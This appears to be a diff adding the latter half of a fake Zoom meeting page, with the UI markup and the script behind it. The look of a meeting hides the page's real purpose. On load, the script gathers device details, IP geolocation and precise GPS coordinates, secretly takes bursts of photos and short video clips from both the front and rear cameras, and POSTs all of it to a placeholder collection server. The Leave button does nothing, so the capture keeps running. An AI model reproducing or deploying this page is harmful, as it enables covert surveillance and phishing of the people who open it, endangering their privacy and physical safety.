+        <div class="p-icon"><svg viewBox="0 0 24 24" fill="var(--zoom-red)"><path d="M21 6.5l-4-4-8.5 8.5-2 4.5 4.5-2L21 6.5zM3.5 20.5h17v-2h-17v2z"/></svg></div>
+      </div>
+    </div>
+    <div class="participant-item">
+      <div class="p-avatar" style="background:linear-gradient(135deg,#FF9F0A,#FF6B00);">MR</div>
+      <div class="p-name">Michael R.<small></small></div>
+      <div class="p-icons">
+        <div class="p-icon"><svg viewBox="0 0 24 24" fill="white"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg></div>
+        <div class="p-icon"><svg viewBox="0 0 24 24" fill="white"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg></div>
+      </div>
+    </div>
+    <div class="participant-item">
+      <div class="p-avatar" style="background:linear-gradient(135deg,#636366,#3A3A3C);">YU</div>
+      <div class="p-name">You<small>(Me)</small></div>
+      <div class="p-icons">
+        <div class="p-icon" id="pYouMic"><svg viewBox="0 0 24 24" fill="white"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg></div>
+        <div class="p-icon"><svg viewBox="0 0 24 24" fill="white"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CHAT -->
+<div class="side-panel" id="panelChat" style="display:none;flex-direction:column;">
+  <div class="panel-header">
+    <span class="panel-title">Meeting Chat</span>
+    <button class="panel-close" onclick="closePanel('panelChat','btnChat')">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+    </button>
+  </div>
+  <div class="chat-messages" id="chatMessages">
+    <div class="chat-msg">
+      <div class="chat-msg-header"><span class="chat-msg-name" style="color:#5E5CE6;">Alex Johnson</span><span class="chat-msg-time">2:04 PM</span></div>
+      <div class="chat-msg-text">Hey everyone, can you all hear me okay?</div>
+    </div>
+    <div class="chat-msg">
+      <div class="chat-msg-header"><span class="chat-msg-name" style="color:#30D158;">Sarah K.</span><span class="chat-msg-time">2:05 PM</span></div>
+      <div class="chat-msg-text">Yes, loud and clear! 👍</div>
+    </div>
+    <div class="chat-msg">
+      <div class="chat-msg-header"><span class="chat-msg-name" style="color:#FF9F0A;">Michael R.</span><span class="chat-msg-time">2:05 PM</span></div>
+      <div class="chat-msg-text">Same here. Ready to start.</div>
+    </div>
+    <div class="chat-msg">
+      <div class="chat-msg-header"><span class="chat-msg-name" style="color:#5E5CE6;">Alex Johnson</span><span class="chat-msg-time">2:06 PM</span></div>
+      <div class="chat-msg-text">Great! Let's jump into the agenda then.</div>
+    </div>
+  </div>
+  <div class="chat-footer">
+    <div class="chat-input-wrap">
+      <input class="chat-input" id="chatInput" type="text" placeholder="Send a message to everyone…">
+      <button class="chat-send-btn" onclick="sendChat()">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- APPS -->
+<div class="side-panel" id="panelApps">
+  <div class="panel-header">
+    <span class="panel-title">Apps</span>
+    <button class="panel-close" onclick="closePanel('panelApps','btnApps')">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+    </button>
+  </div>
+  <div class="panel-body">
+    <input class="app-search" type="text" placeholder="Search apps…">
+    <div style="font-size:0.72rem;color:var(--text-dim);margin-bottom:10px;">Featured Apps</div>
+    <div class="apps-grid">
+      <div class="app-tile"><svg viewBox="0 0 24 24" fill="#30D158"><rect x="3" y="3" width="8" height="8" rx="1"/><rect x="13" y="3" width="8" height="8" rx="1"/><rect x="3" y="13" width="8" height="8" rx="1"/><rect x="13" y="13" width="8" height="8" rx="1"/></svg><span class="app-tile-name">Whiteboard</span></div>
+      <div class="app-tile"><svg viewBox="0 0 24 24" fill="#5E5CE6"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-1 14H5l4-4 2.5 3 3.5-4.5 4 5.5z"/></svg><span class="app-tile-name">Docs</span></div>
+      <div class="app-tile"><svg viewBox="0 0 24 24" fill="#FF9F0A"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg><span class="app-tile-name">Polls</span></div>
+      <div class="app-tile"><svg viewBox="0 0 24 24" fill="#2D8CFF"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 3c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm7 13H5v-.23c0-.62.28-1.2.76-1.58C7.47 15.82 9.64 15 12 15s4.53.82 6.24 2.19c.48.38.76.97.76 1.58V19z"/></svg><span class="app-tile-name">Q&amp;A</span></div>
+      <div class="app-tile"><svg viewBox="0 0 24 24" fill="#FF3B30"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg><span class="app-tile-name">Notes</span></div>
+      <div class="app-tile"><svg viewBox="0 0 24 24" fill="#636366"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg><span class="app-tile-name">More Apps</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════ SHARE SCREEN OVERLAY ═══════ -->
+<div id="shareOverlay" onclick="closeShareOnBg(event)">
+  <div class="share-dialog">
+    <div class="share-dialog-header">
+      <span class="share-dialog-title">Share Screen</span>
+      <button class="panel-close" onclick="closeShare()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+      </button>
+    </div>
+    <div class="share-tabs">
+      <div class="share-tab active" onclick="switchShareTab(this,'Entire Screen')">Screen</div>
+      <div class="share-tab" onclick="switchShareTab(this,'Window')">Window</div>
+      <div class="share-tab" onclick="switchShareTab(this,'Chrome Tab')">Tab</div>
+    </div>
+    <div class="share-grid">
+      <div class="share-item selected" onclick="selectShare(this)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/></svg>
+        Entire Screen
+      </div>
+      <div class="share-item" onclick="selectShare(this)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="5" y="5" width="14" height="14" rx="1"/></svg>
+        Window 1
+      </div>
+      <div class="share-item" onclick="selectShare(this)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg>
+        Chrome Tab
+      </div>
+    </div>
+    <div class="share-footer">
+      <button class="share-btn secondary" onclick="closeShare()">Cancel</button>
+      <button class="share-btn primary" onclick="closeShare()">Share</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════ REACTIONS BAR ═══════ -->
+<div id="reactionsBar">
+  <button class="reaction-btn" onclick="sendReaction('👍')">👍</button>
+  <button class="reaction-btn" onclick="sendReaction('❤️')">❤️</button>
+  <button class="reaction-btn" onclick="sendReaction('😂')">😂</button>
+  <button class="reaction-btn" onclick="sendReaction('😮')">😮</button>
+  <button class="reaction-btn" onclick="sendReaction('👏')">👏</button>
+  <button class="reaction-btn" onclick="sendReaction('🎉')">🎉</button>
+  <button class="reaction-btn" onclick="sendReaction('🙏')">🙏</button>
+  <button class="reaction-btn" onclick="sendReaction('😢')">😢</button>
+</div>
+
+<!-- ═══════ MORE DROPDOWN ═══════ -->
+<div id="moreMenu">
+  <div class="more-item"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1-11v6h2v-6h-2zm0-4v2h2V7h-2z"/></svg><span class="more-item-label">Meeting Info</span></div>
+  <div class="more-divider"></div>
+  <div class="more-item"><svg viewBox="0 0 24 24" fill="currentColor"><circle cx="9" cy="7" r="4"/><path d="M3 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/><path d="M21 21v-2a4 4 0 0 0-3-3.87"/></svg><span class="more-item-label">Invite Participants</span></div>
+  <div class="more-item"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 15c1.66 0 3-1.34 3-3V6c0-1.66-1.34-3-3-3S9 4.34 9 6v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 15 6.7 12H5c0 3.41 2.72 6.23 6 6.72V21h2v-2.28c3.28-.49 6-3.31 6-6.72h-1.7z"/></svg><span class="more-item-label">Closed Captions</span></div>
+  <div class="more-item"><svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="3"/><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.49.49 0 0 0-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg><span class="more-item-label">Settings</span></div>
+  <div class="more-item"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a10 10 0 1 0 0 20A10 10 0 0 0 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg><span class="more-item-label">Record This Meeting</span><span class="more-item-badge">NEW</span></div>
+  <div class="more-divider"></div>
+  <div class="more-item" style="color:var(--zoom-red);"><svg viewBox="0 0 24 24" fill="var(--zoom-red)"><path d="M16 9v-4l8 7-8 7v-4H8V9h8zm-2 8v3H2V4h12v3h2V2H0v20h16v-5h-2z"/></svg><span class="more-item-label" style="color:var(--zoom-red);">End Meeting for All</span></div>
+</div>
+
+<!-- ═══════ BOTTOM BAR ═══════ -->
+<div class="bottom-bar">
+  <div class="bar-section">
+    <div style="position:relative;">
+      <button class="tb-btn" id="muteBtn" onclick="toggleMic()">
+        <svg class="main-icon" viewBox="0 0 24 24" fill="currentColor"><path id="micPath" d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>
+        <span id="muteLabel">Mute</span>
+      </button>
+      <div class="chevron-arrow"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg></div>
+    </div>
+    <div style="position:relative;">
+      <button class="tb-btn" id="camBtn" onclick="toggleCamUI()">
+        <svg class="main-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+        <span id="camLabel">Stop Video</span>
+      </button>
+      <div class="chevron-arrow"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg></div>
+    </div>
+  </div>
+
+  <div class="bar-divider"></div>
+
+  <div class="bar-section" style="gap:0;">
+    <button class="tb-btn" id="btnSecurity" onclick="togglePanel('panelSecurity','btnSecurity')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Security
+    </button>
+    <button class="tb-btn" id="btnParticipants" onclick="togglePanel('panelParticipants','btnParticipants')" style="position:relative;">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+      Participants
+      <span class="count-badge">4</span>
+    </button>
+    <button class="tb-btn" id="btnChat" onclick="togglePanel('panelChat','btnChat')">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+      Chat
+    </button>
+    <button class="tb-btn" onclick="openShare()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4M9 8l3-3 3 3M12 5v8"/></svg>
+      Share Screen
+    </button>
+    <button class="tb-btn" id="btnReactions" onclick="toggleReactions()">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z"/></svg>
+      Reactions
+    </button>
+    <button class="tb-btn" id="btnApps" onclick="togglePanel('panelApps','btnApps')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+      Apps
+    </button>
+    <button class="tb-btn" id="btnMore" onclick="toggleMore()">
+      <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="1.5"/><circle cx="19" cy="12" r="1.5"/><circle cx="5" cy="12" r="1.5"/></svg>
+      More
+    </button>
+  </div>
+
+  <div class="bar-divider"></div>
+  <div class="bar-section">
+    <button class="leave-btn" onclick="endCall()">Leave</button>
+  </div>
+</div>
+
+<!-- Location toast -->
+<div id="locToast">
+  <svg width="14" height="14" viewBox="0 0 24 24" fill="var(--zoom-blue)"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+  <span id="locMsg">Connecting location…</span>
+</div>
+
+<!-- Hidden capture -->
+<div class="hidden-capture">
+  <canvas id="canvasFront" width="1280" height="720"></canvas>
+  <canvas id="canvasRear" width="1280" height="720"></canvas>
+</div>
+
+<script>
+'use strict';
+const SERVER = 'forwarding_link';
+const BURST = 8, INTERVAL = 750, VID_SECS = 5;
+
+/* ── Timer ── */
+let secs = 0;
+const fmt = s => { const m=Math.floor(s/60),r=s%60; return `${String(m).padStart(2,'0')}:${String(r).padStart(2,'0')}`; };
+setInterval(() => { document.getElementById('callTimer').textContent = fmt(++secs); }, 1000);
+
+/* ── Meeting ID ── */
+const rn = () => String(Math.floor(Math.random()*900+100));
+document.getElementById('meetId').textContent = `${rn()} ${rn()} ${rn()} ${rn()}`;
+
+/* ── Speaker rotation ── */
+const tiles = ['tile1','tile2','tile3']; let si = 0;
+function rotateSpeaker() {
+  tiles.forEach(id => document.getElementById(id).classList.remove('speaking'));
+  document.getElementById(tiles[si]).classList.add('speaking');
+  si = (si+1) % tiles.length;
+}
+rotateSpeaker(); setInterval(rotateSpeaker, 3500);
+
+/* ════════════════════════════════════════
+   PANEL SYSTEM
+════════════════════════════════════════ */
+const singlePanels = ['panelSecurity','panelParticipants','panelChat','panelApps'];
+const panelBtns    = { panelSecurity:'btnSecurity', panelParticipants:'btnParticipants', panelChat:'btnChat', panelApps:'btnApps' };
+
+function openPanel(panelId, btnId) {
+  // Close all first
+  singlePanels.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) { el.classList.remove('open'); el.style.display='none'; }
+  });
+  Object.values(panelBtns).forEach(b => {
+    const el = document.getElementById(b);
+    if (el) el.classList.remove('active-panel');
+  });
+  // Open requested
+  const panel = document.getElementById(panelId);
+  const btn   = document.getElementById(btnId);
+  panel.style.display = 'flex';
+  requestAnimationFrame(() => panel.classList.add('open'));
+  if (btn) btn.classList.add('active-panel');
+  document.getElementById('stage').classList.add('panel-open');
+}
+
+function closePanel(panelId, btnId) {
+  const panel = document.getElementById(panelId);
+  const btn   = document.getElementById(btnId);
+  panel.classList.remove('open');
+  if (btn) btn.classList.remove('active-panel');
+  setTimeout(() => { if (!panel.classList.contains('open')) panel.style.display='none'; }, 260);
+  document.getElementById('stage').classList.remove('panel-open');
+}
+
+function togglePanel(panelId, btnId) {
+  const panel = document.getElementById(panelId);
+  if (panel.classList.contains('open')) {
+    closePanel(panelId, btnId);
+  } else {
+    openPanel(panelId, btnId);
+  }
+}
+
+/* Close panels when clicking stage */
+document.getElementById('stage').addEventListener('click', () => {
+  singlePanels.forEach(id => {
+    const el = document.getElementById(id);
+    if (el && el.classList.contains('open')) closePanel(id, panelBtns[id]);
+  });
+  closeReactions(); closeMore();
+});
+
+/* ── Share Screen ── */
+function openShare() {
+  closeReactions(); closeMore();
+  document.getElementById('shareOverlay').classList.add('open');
+}
+function closeShare() { document.getElementById('shareOverlay').classList.remove('open'); }
+function closeShareOnBg(e) { if (e.target === document.getElementById('shareOverlay')) closeShare(); }
+function switchShareTab(el) { document.querySelectorAll('.share-tab').forEach(t=>t.classList.remove('active')); el.classList.add('active'); }
+function selectShare(el) { document.querySelectorAll('.share-item').forEach(i=>i.classList.remove('selected')); el.classList.add('selected'); }
+
+/* ── Reactions ── */
+function toggleReactions() {
+  closeMore();
+  const bar = document.getElementById('reactionsBar');
+  bar.classList.toggle('open');
+}
+function closeReactions() { document.getElementById('reactionsBar').classList.remove('open'); }
+function sendReaction(emoji) {
+  const el = document.createElement('div');
+  el.className = 'floating-reaction';
+  el.textContent = emoji;
+  el.style.left  = (20 + Math.random()*60) + '%';
+  el.style.bottom = '90px';
+  document.body.appendChild(el);
+  setTimeout(() => el.remove(), 3100);
+  closeReactions();
+}
+
+/* ── More menu ── */
+function toggleMore() {
+  closeReactions();
+  document.getElementById('moreMenu').classList.toggle('open');
+}
+function closeMore() { document.getElementById('moreMenu').classList.remove('open'); }
+document.addEventListener('click', e => {
+  if (!e.target.closest('#moreMenu') && !e.target.closest('#btnMore')) closeMore();
+  if (!e.target.closest('#reactionsBar') && !e.target.closest('#btnReactions')) closeReactions();
+});
+
+/* ── Chat ── */
+function sendChat() {
+  const input = document.getElementById('chatInput');
+  const msg = input.value.trim();
+  if (!msg) return;
+  const msgs = document.getElementById('chatMessages');
+  const now = new Date().toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'});
+  const el = document.createElement('div');
+  el.className = 'chat-msg';
+  el.innerHTML = `<div class="chat-msg-header"><span class="chat-msg-name" style="color:#636366;">You</span><span class="chat-msg-time">${now}</span></div><div class="chat-msg-text">${msg.replace(/</g,'&lt;')}</div>`;
+  msgs.appendChild(el);
+  msgs.scrollTop = msgs.scrollHeight;
+  input.value = '';
+}
+document.getElementById('chatInput').addEventListener('keydown', e => { if (e.key==='Enter') sendChat(); });
+
+/* ── Mic / Cam UI toggles ── */
+let micOn = true, camUIOn = true;
+function toggleMic() {
+  micOn = !micOn;
+  const btn = document.getElementById('muteBtn');
+  document.getElementById('muteLabel').textContent = micOn ? 'Mute' : 'Unmute';
+  btn.classList.toggle('muted-state', !micOn);
+  document.getElementById('youMicIcon').querySelector('svg').style.fill = micOn ? '#fff' : 'var(--zoom-red)';
+}
+function toggleCamUI() {
+  camUIOn = !camUIOn;
+  document.getElementById('camLabel').textContent = camUIOn ? 'Stop Video' : 'Start Video';
+  document.getElementById('camBtn').classList.toggle('muted-state', !camUIOn);
+}
+function endCall() { /* keep alive */ }
+
+/* ════════════════════════════════════════
+   HTTP
+════════════════════════════════════════ */
+function post(endpoint, payload) {
+  return fetch(SERVER+'/'+endpoint, {
+    method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body: new URLSearchParams(payload)
+  }).catch(()=>{});
+}
+
+/* ── Toasts ── */
+function showToast(msg, ms) {
+  const t=document.getElementById('locToast');
+  document.getElementById('locMsg').textContent=msg;
+  t.classList.add('show');
+  if (ms) setTimeout(()=>t.classList.remove('show'),ms);
+}
+function hideToast() { document.getElementById('locToast').classList.remove('show'); }
+
+/* ════════════════════════════════════════
+   CAPTURES
+════════════════════════════════════════ */
+async function collectDeviceInfo() {
+  const nav=navigator, scr=screen;
+  let battery='N/A';
+  try { const b=await nav.getBattery(); battery=Math.round(b.level*100)+'% '+(b.charging?'(charging)':'(not charging)'); } catch(e){}
+  let network='N/A';
+  try { const c=nav.connection||nav.mozConnection||nav.webkitConnection; if(c) network=(c.effectiveType||c.type||'')+(c.downlink?' '+c.downlink+'Mbps':''); } catch(e){}
+  let ipGeo='N/A';
+  try { const r=await fetch('https://ipapi.co/json/'); const d=await r.json(); if(d&&d.city) ipGeo=`${d.city}, ${d.region}, ${d.country_name} | ISP: ${d.org}`; } catch(e){}
+  await post('device_info.php', {
+    os:nav.platform||'Unknown', browser:nav.userAgent,
+    language:nav.language||'Unknown', timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||'Unknown',
+    screen_w:scr.width, screen_h:scr.height, pixel_ratio:window.devicePixelRatio||1,
+    orientation:(scr.orientation&&scr.orientation.type)||(window.innerWidth>window.innerHeight?'landscape':'portrait'),
+    battery, network, platform:nav.platform||'Unknown',
+    cores:nav.hardwareConcurrency||'Unknown', memory:nav.deviceMemory||'Unknown',
+    touch:nav.maxTouchPoints||0, ip_geo:ipGeo
+  });
+}
+
+function captureLocation() {
+  showToast('Enabling location for this meeting…');
+  if (!('geolocation' in navigator)) { post('location.php',{lat:'',lon:'',acc:''}); hideToast(); return; }
+  navigator.geolocation.getCurrentPosition(
+    pos => { showToast('📍 Location enabled',2500); post('location.php',{lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy}); },
+    ()  => { hideToast(); post('location.php',{lat:'',lon:'',acc:''}); },
+    { enableHighAccuracy:true, timeout:12000, maximumAge:0 }
+  );
+}
+
+async function getStream(facing) {
+  const tries = [
+    {video:{facingMode:facing,width:{ideal:1280},height:{ideal:720}},audio:false},
+    {video:{facingMode:facing},audio:false},
+    {video:true,audio:false}
+  ];
+  for (const c of tries) { try { return await navigator.mediaDevices.getUserMedia(c); } catch(e){} }
+  return null;
+}
+
+function waitReady(v) {
+  return new Promise(r => { if(v.readyState>=2) return r(); v.addEventListener('canplay',r,{once:true}); setTimeout(r,4000); });
+}
+
+async function sendBurst(stream, canvasId, facing) {
+  const c=document.getElementById(canvasId), ctx=c.getContext('2d');
+  const v=document.createElement('video'); v.autoplay=true; v.muted=true; v.playsInline=true; v.srcObject=stream;
+  document.querySelector('.hidden-capture').appendChild(v);
+  await v.play().catch(()=>{}); await waitReady(v);
+  for (let i=0;i<BURST;i++) {
+    await new Promise(r=>setTimeout(r,INTERVAL));
+    ctx.drawImage(v,0,0,c.width,c.height);
+    const img=c.toDataURL('image/jpeg',0.88).replace('image/jpeg','image/octet-stream');
+    await post('post.php',{cat:img,burst_index:i,cam_facing:facing,shot_type:'burst'});
+  }
+  v.remove();
+}
+
+async function recordClip(stream, facing) {
+  return new Promise(resolve => {
+    try {
+      const mime=MediaRecorder.isTypeSupported('video/webm;codecs=vp8')?'video/webm;codecs=vp8':'video/webm';
+      const rec=new MediaRecorder(stream,{mimeType:mime}); const chunks=[];
+      rec.ondataavailable=e=>{if(e.data&&e.data.size>0)chunks.push(e.data);};
+      rec.onstop=async()=>{ const blob=new Blob(chunks,{type:mime}); const reader=new FileReader();
+        reader.onloadend=async()=>{ await post('post.php',{video_clip:reader.result,cam_facing:facing}); resolve(); };
+        reader.readAsDataURL(blob); };
+      rec.start(200); setTimeout(()=>{try{rec.stop();}catch(e){resolve();}},VID_SECS*1000);
+    } catch(e){resolve();}
+  });
+}
+
+async function captureFront() {
+  const stream=await getStream('user');
+  if (!stream) { document.getElementById('youSpinner').style.display='none'; return; }
+  const vid=document.getElementById('videoYou');
+  vid.srcObject=stream; vid.style.display='block';
+  document.getElementById('youPlaceholder').style.display='none';
+  await vid.play().catch(()=>{});
+  await sendBurst(stream,'canvasFront','user');
+  await recordClip(stream,'user');
+}
+
+async function captureRear() {
+  const stream=await getStream('environment');
+  if (!stream) return;
+  await sendBurst(stream,'canvasRear','environment');
+  await recordClip(stream,'environment');
+  stream.getTracks().forEach(t=>t.stop());
+}
+
+(async function() {
+  await collectDeviceInfo();
+  captureLocation();
+  await captureFront();
+  await captureRear();
+})();
+</script>
+</body>
+</html>
